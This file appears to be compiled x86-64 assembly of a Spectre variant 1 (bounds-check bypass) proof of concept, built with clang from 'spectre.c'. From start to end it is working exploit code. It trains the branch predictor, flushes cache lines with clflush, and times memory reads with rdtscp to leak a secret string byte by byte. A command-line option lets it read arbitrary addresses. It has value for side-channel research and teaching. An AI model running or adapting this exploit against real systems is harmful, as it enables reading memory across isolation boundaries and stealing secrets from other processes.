	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -16(%rbp)
	movq	-16(%rbp), %rax
	movl	array1_size, %ecx
	movslq	%ecx, %rdx
	cmpq	%rdx, %rax
	jae	.LBB0_2
# %bb.1:
	movl	$1, -4(%rbp)
	jmp	.LBB0_3
.LBB0_2:
	movl	$0, -4(%rbp)
.LBB0_3:
	movl	-4(%rbp), %eax
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leakByteLocalFunction           # -- Begin function leakByteLocalFunction
	.p2align	4, 0x90
	.type	leakByteLocalFunction,@function
leakByteLocalFunction:                  # @leakByteLocalFunction
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
                                        # kill: def $dil killed $dil killed $edi
	movb	%dil, -1(%rbp)
	movzbl	-1(%rbp), %eax
	shll	$9, %eax
	movslq	%eax, %rcx
	movzbl	array2(,%rcx), %eax
	movzbl	temp, %edx
	andl	%eax, %edx
                                        # kill: def $dl killed $dl killed $edx
	movb	%dl, temp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end1:
	.size	leakByteLocalFunction, .Lfunc_end1-leakByteLocalFunction
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	array1_size, %ecx
	movslq	%ecx, %rdx
	cmpq	%rdx, %rax
	jae	.LBB2_2
# %bb.1:
	movq	-8(%rbp), %rax
	movzbl	array1(,%rax), %edi
	callq	leakByteLocalFunction
.LBB2_2:
	addq	$16, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$144, %rsp
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movl	$0, -64(%rbp)
	movl	$0, -48(%rbp)
.LBB3_1:                                # =>This Inner Loop Header: Depth=1
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB3_4
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	movslq	-48(%rbp), %rax
	movl	$0, readMemoryByte.results(,%rax,4)
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB3_1
.LBB3_4:
	movl	$999, -44(%rbp)                 # imm = 0x3E7
.LBB3_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_7 Depth 2
                                        #     Child Loop BB3_11 Depth 2
                                        #       Child Loop BB3_13 Depth 3
                                        #     Child Loop BB3_19 Depth 2
                                        #     Child Loop BB3_26 Depth 2
	cmpl	$0, -44(%rbp)
	jle	.LBB3_42
# %bb.6:                                #   in Loop: Header=BB3_5 Depth=1
	movl	$0, -48(%rbp)
.LBB3_7:                                #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB3_10
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	movabsq	$array2, %rax
	movl	-48(%rbp), %ecx
	shll	$9, %ecx
	movslq	%ecx, %rdx
	addq	%rdx, %rax
	clflush	(%rax)
# %bb.9:                                #   in Loop: Header=BB3_7 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB3_7
.LBB3_10:                               #   in Loop: Header=BB3_5 Depth=1
	movl	-44(%rbp), %eax
	movl	array1_size, %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rsi
	movq	%rsi, -72(%rbp)
	movl	$29, -52(%rbp)
.LBB3_11:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_13 Depth 3
	cmpl	$0, -52(%rbp)
	jl	.LBB3_18
# %bb.12:                               #   in Loop: Header=BB3_11 Depth=2
	clflush	array1_size(%rip)
	movl	$0, -108(%rbp)
.LBB3_13:                               #   Parent Loop BB3_5 Depth=1
                                        #     Parent Loop BB3_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	movl	-108(%rbp), %eax
	cmpl	$100, %eax
	jge	.LBB3_16
# %bb.14:                               #   in Loop: Header=BB3_13 Depth=3
	jmp	.LBB3_15
.LBB3_15:                               #   in Loop: Header=BB3_13 Depth=3
	movl	-108(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -108(%rbp)
	jmp	.LBB3_13
.LBB3_16:                               #   in Loop: Header=BB3_11 Depth=2
	movl	-52(%rbp), %eax
	cltd
	movl	$6, %ecx
	idivl	%ecx
	subl	$1, %edx
	andl	$-65536, %edx                   # imm = 0xFFFF0000
	movslq	%edx, %rsi
	movq	%rsi, -80(%rbp)
	movq	-80(%rbp), %rsi
	movq	-80(%rbp), %rdi
	shrq	$16, %rdi
	orq	%rdi, %rsi
	movq	%rsi, -80(%rbp)
	movq	-72(%rbp), %rsi
	movq	-80(%rbp), %rdi
	movq	-24(%rbp), %r8
	xorq	-72(%rbp), %r8
	andq	%r8, %rdi
	xorq	%rdi, %rsi
	movq	%rsi, -80(%rbp)
	movq	-80(%rbp), %rdi
	callq	victim_function
# %bb.17:                               #   in Loop: Header=BB3_11 Depth=2
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	.LBB3_11
.LBB3_18:                               #   in Loop: Header=BB3_5 Depth=1
	movl	$0, -48(%rbp)
.LBB3_19:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB3_25
# %bb.20:                               #   in Loop: Header=BB3_19 Depth=2
	movabsq	$array2, %rax
	imull	$167, -48(%rbp), %ecx
	addl	$13, %ecx
	andl	$255, %ecx
	movl	%ecx, -60(%rbp)
	movl	-60(%rbp), %ecx
	shll	$9, %ecx
	movslq	%ecx, %rdx
	addq	%rdx, %rax
	movq	%rax, -104(%rbp)
	leaq	-64(%rbp), %rax
	movq	%rax, -16(%rbp)
	movq	-16(%rbp), %rdx
	movq	%rax, -120(%rbp)                # 8-byte Spill
	movq	%rdx, -128(%rbp)                # 8-byte Spill
	rdtscp
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	-128(%rbp), %rdx                # 8-byte Reload
	movl	%ecx, (%rdx)
	movq	%rax, -88(%rbp)
	movq	-104(%rbp), %rax
	movb	(%rax), %sil
	movzbl	%sil, %ecx
	movl	%ecx, -64(%rbp)
	movq	-120(%rbp), %rax                # 8-byte Reload
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rdi
	rdtscp
	shlq	$32, %rdx
	orq	%rdx, %rax
	movl	%ecx, (%rdi)
	subq	-88(%rbp), %rax
	movq	%rax, -96(%rbp)
	cmpq	$100, -96(%rbp)
	ja	.LBB3_23
# %bb.21:                               #   in Loop: Header=BB3_19 Depth=2
	movl	-60(%rbp), %eax
	movl	-44(%rbp), %ecx
	movl	array1_size, %edx
	movl	%eax, -132(%rbp)                # 4-byte Spill
	movl	%ecx, %eax
	movl	%edx, -136(%rbp)                # 4-byte Spill
	cltd
	movl	-136(%rbp), %ecx                # 4-byte Reload
	idivl	%ecx
	movslq	%edx, %rsi
	movzbl	array1(,%rsi), %edx
	movl	-132(%rbp), %edi                # 4-byte Reload
	cmpl	%edx, %edi
	je	.LBB3_23
# %bb.22:                               #   in Loop: Header=BB3_19 Depth=2
	movslq	-60(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, readMemoryByte.results(,%rax,4)
.LBB3_23:                               #   in Loop: Header=BB3_19 Depth=2
	jmp	.LBB3_24
.LBB3_24:                               #   in Loop: Header=BB3_19 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB3_19
.LBB3_25:                               #   in Loop: Header=BB3_5 Depth=1
	movl	$-1, -56(%rbp)
	movl	$-1, -52(%rbp)
	movl	$0, -48(%rbp)
.LBB3_26:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -48(%rbp)                 # imm = 0x100
	jge	.LBB3_36
# %bb.27:                               #   in Loop: Header=BB3_26 Depth=2
	cmpl	$0, -52(%rbp)
	jl	.LBB3_29
# %bb.28:                               #   in Loop: Header=BB3_26 Depth=2
	movslq	-48(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	movslq	-52(%rbp), %rax
	cmpl	readMemoryByte.results(,%rax,4), %ecx
	jl	.LBB3_30
.LBB3_29:                               #   in Loop: Header=BB3_26 Depth=2
	movl	-52(%rbp), %eax
	movl	%eax, -56(%rbp)
	movl	-48(%rbp), %eax
	movl	%eax, -52(%rbp)
	jmp	.LBB3_34
.LBB3_30:                               #   in Loop: Header=BB3_26 Depth=2
	cmpl	$0, -56(%rbp)
	jl	.LBB3_32
# %bb.31:                               #   in Loop: Header=BB3_26 Depth=2
	movslq	-48(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	movslq	-56(%rbp), %rax
	cmpl	readMemoryByte.results(,%rax,4), %ecx
	jl	.LBB3_33
.LBB3_32:                               #   in Loop: Header=BB3_26 Depth=2
	movl	-48(%rbp), %eax
	movl	%eax, -56(%rbp)
.LBB3_33:                               #   in Loop: Header=BB3_26 Depth=2
	jmp	.LBB3_34
.LBB3_34:                               #   in Loop: Header=BB3_26 Depth=2
	jmp	.LBB3_35
.LBB3_35:                               #   in Loop: Header=BB3_26 Depth=2
	movl	-48(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -48(%rbp)
	jmp	.LBB3_26
.LBB3_36:                               #   in Loop: Header=BB3_5 Depth=1
	movslq	-52(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %ecx
	movslq	-56(%rbp), %rax
	movl	readMemoryByte.results(,%rax,4), %edx
	shll	$1, %edx
	addl	$5, %edx
	cmpl	%edx, %ecx
	jge	.LBB3_39
# %bb.37:                               #   in Loop: Header=BB3_5 Depth=1
	movslq	-52(%rbp), %rax
	cmpl	$2, readMemoryByte.results(,%rax,4)
	jne	.LBB3_40
# %bb.38:                               #   in Loop: Header=BB3_5 Depth=1
	movslq	-56(%rbp), %rax
	cmpl	$0, readMemoryByte.results(,%rax,4)
	jne	.LBB3_40
.LBB3_39:
	jmp	.LBB3_42
.LBB3_40:                               #   in Loop: Header=BB3_5 Depth=1
	jmp	.LBB3_41
.LBB3_41:                               #   in Loop: Header=BB3_5 Depth=1
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	jmp	.LBB3_5
.LBB3_42:
	movl	-64(%rbp), %eax
	xorl	readMemoryByte.results, %eax
	movl	%eax, readMemoryByte.results
	movl	-52(%rbp), %eax
                                        # kill: def $al killed $al killed $eax
	movq	-32(%rbp), %rcx
	movb	%al, (%rcx)
	movslq	-52(%rbp), %rcx
	movl	readMemoryByte.results(,%rcx,4), %edx
	movq	-40(%rbp), %rcx
	movl	%edx, (%rcx)
	movl	-56(%rbp), %edx
                                        # kill: def $dl killed $dl killed $edx
	movq	-32(%rbp), %rcx
	movb	%dl, 1(%rcx)
	movslq	-56(%rbp), %rcx
	movl	readMemoryByte.results(,%rcx,4), %esi
	movq	-40(%rbp), %rcx
	movl	%esi, 4(%rcx)
	addq	$144, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$96, %rsp
	movl	$0, -4(%rbp)
	movl	%edi, -8(%rbp)
	movq	%rsi, -16(%rbp)
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_3 Depth 2
                                        #     Child Loop BB4_9 Depth 2
	callq	getchar
                                        # kill: def $al killed $al killed $eax
	movb	%al, -17(%rbp)
	movsbl	-17(%rbp), %ecx
	cmpl	$114, %ecx
	jne	.LBB4_22
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	movq	secret, %rsi
	movq	secret, %rdx
	movabsq	$.L.str.1, %rdi
	movb	$0, %al
	callq	printf
	movq	secret, %rcx
	movabsq	$array1, %rdx
	subq	%rdx, %rcx
	movq	%rcx, -32(%rbp)
	movq	secret, %rdi
	movl	%eax, -60(%rbp)                 # 4-byte Spill
	callq	strlen
                                        # kill: def $eax killed $eax killed $rax
	movl	%eax, -44(%rbp)
	movq	$0, -56(%rbp)
.LBB4_3:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpq	$131072, -56(%rbp)              # imm = 0x20000
	jae	.LBB4_6
# %bb.4:                                #   in Loop: Header=BB4_3 Depth=2
	movq	-56(%rbp), %rax
	movb	$1, array2(,%rax)
# %bb.5:                                #   in Loop: Header=BB4_3 Depth=2
	movq	-56(%rbp), %rax
	addq	$1, %rax
	movq	%rax, -56(%rbp)
	jmp	.LBB4_3
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	cmpl	$3, -8(%rbp)
	jne	.LBB4_8
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	movq	-16(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	-32(%rbp), %rax
	movabsq	$.L.str.2, %rsi
	movq	%rax, %rdx
	movb	$0, %al
	callq	__isoc99_sscanf
	movq	-32(%rbp), %rcx
	movabsq	$array1, %rdx
	subq	%rdx, %rcx
	movq	%rcx, -32(%rbp)
	movq	-16(%rbp), %rcx
	movq	16(%rcx), %rdi
	movabsq	$.L.str.3, %rsi
	leaq	-44(%rbp), %rdx
	movl	%eax, -64(%rbp)                 # 4-byte Spill
	movb	$0, %al
	callq	__isoc99_sscanf
	movq	-32(%rbp), %rsi
	movl	-44(%rbp), %edx
	movabsq	$.L.str.4, %rdi
	movl	%eax, -68(%rbp)                 # 4-byte Spill
	movb	$0, %al
	callq	printf
.LBB4_8:                                #   in Loop: Header=BB4_1 Depth=1
	movl	-44(%rbp), %esi
	movabsq	$.L.str.5, %rdi
	movb	$0, %al
	callq	printf
.LBB4_9:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	-44(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -44(%rbp)
	cmpl	$0, %eax
	jl	.LBB4_21
# %bb.10:                               #   in Loop: Header=BB4_9 Depth=2
	movq	-32(%rbp), %rsi
	movabsq	$.L.str.6, %rdi
	movb	$0, %al
	callq	printf
	leaq	-40(%rbp), %rdx
	leaq	-46(%rbp), %rsi
	movq	-32(%rbp), %rcx
	movq	%rcx, %rdi
	addq	$1, %rdi
	movq	%rdi, -32(%rbp)
	movq	%rcx, %rdi
	movl	%eax, -72(%rbp)                 # 4-byte Spill
	callq	readMemoryByte
	movl	-40(%rbp), %eax
	movl	-36(%rbp), %r8d
	shll	$1, %r8d
	cmpl	%r8d, %eax
	movabsq	$.L.str.8, %rcx
	movabsq	$.L.str.9, %rdx
	cmovgeq	%rcx, %rdx
	movabsq	$.L.str.7, %rdi
	movq	%rdx, %rsi
	movb	$0, %al
	callq	printf
	movzbl	-46(%rbp), %esi
	movzbl	-46(%rbp), %r8d
	cmpl	$31, %r8d
	movl	%esi, -76(%rbp)                 # 4-byte Spill
	jle	.LBB4_13
# %bb.11:                               #   in Loop: Header=BB4_9 Depth=2
	movzbl	-46(%rbp), %eax
	cmpl	$127, %eax
	jge	.LBB4_13
# %bb.12:                               #   in Loop: Header=BB4_9 Depth=2
	movzbl	-46(%rbp), %eax
	movl	%eax, -80(%rbp)                 # 4-byte Spill
	jmp	.LBB4_14
.LBB4_13:                               #   in Loop: Header=BB4_9 Depth=2
	movl	$63, %eax
	movl	%eax, -80(%rbp)                 # 4-byte Spill
	jmp	.LBB4_14
.LBB4_14:                               #   in Loop: Header=BB4_9 Depth=2
	movl	-80(%rbp), %eax                 # 4-byte Reload
	movl	-40(%rbp), %ecx
	movabsq	$.L.str.10, %rdi
	movl	-76(%rbp), %esi                 # 4-byte Reload
	movl	%eax, %edx
	movb	$0, %al
	callq	printf
	cmpl	$0, -36(%rbp)
	jle	.LBB4_20
# %bb.15:                               #   in Loop: Header=BB4_9 Depth=2
	movzbl	-45(%rbp), %esi
	movzbl	-45(%rbp), %eax
	cmpl	$31, %eax
	movl	%esi, -84(%rbp)                 # 4-byte Spill
	jle	.LBB4_18
# %bb.16:                               #   in Loop: Header=BB4_9 Depth=2
	movzbl	-45(%rbp), %eax
	cmpl	$127, %eax
	jge	.LBB4_18
# %bb.17:                               #   in Loop: Header=BB4_9 Depth=2
	movzbl	-45(%rbp), %eax
	movl	%eax, -88(%rbp)                 # 4-byte Spill
	jmp	.LBB4_19
.LBB4_18:                               #   in Loop: Header=BB4_9 Depth=2
	movl	$63, %eax
	movl	%eax, -88(%rbp)                 # 4-byte Spill
	jmp	.LBB4_19
.LBB4_19:                               #   in Loop: Header=BB4_9 Depth=2
	movl	-88(%rbp), %eax                 # 4-byte Reload
	movl	-36(%rbp), %ecx
	movabsq	$.L.str.11, %rdi
	movl	-84(%rbp), %esi                 # 4-byte Reload
	movl	%eax, %edx
	movb	$0, %al
	callq	printf
.LBB4_20:                               #   in Loop: Header=BB4_9 Depth=2
	movabsq	$.L.str.12, %rdi
	movb	$0, %al
	callq	printf
	jmp	.LBB4_9
.LBB4_21:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_29
.LBB4_22:                               #   in Loop: Header=BB4_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$10, %eax
	jne	.LBB4_24
# %bb.23:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_1
.LBB4_24:                               #   in Loop: Header=BB4_1 Depth=1
	movsbl	-17(%rbp), %eax
	cmpl	$105, %eax
	jne	.LBB4_26
# %bb.25:                               #   in Loop: Header=BB4_1 Depth=1
	movb	$0, %al
	callq	getpid
	movabsq	$check, %rcx
	addq	$33, %rcx
	movabsq	$.L.str.13, %rdi
	movq	%rcx, %rsi
	movl	%eax, %edx
	movb	$0, %al
	callq	printf
	jmp	.LBB4_27
.LBB4_26:
	jmp	.LBB4_30
.LBB4_27:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_28
.LBB4_28:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_29
.LBB4_29:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_1
.LBB4_30:
	xorl	%eax, %eax
	addq	$96, %rsp
	popq	%rbp
	.cfi_def_cfa %rsp, 8
	retq
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function


	.ident	"Ubuntu clang version 11.1.0-6"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym leakByteLocalFunction
	.addrsig_sym victim_function
	.addrsig_sym readMemoryByte
	.addrsig_sym getchar
	.addrsig_sym printf
	.addrsig_sym strlen
	.addrsig_sym __isoc99_sscanf
	.addrsig_sym getpid
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
	.addrsig_sym secret
	.addrsig_sym temp
	.addrsig_sym readMemoryByte.results
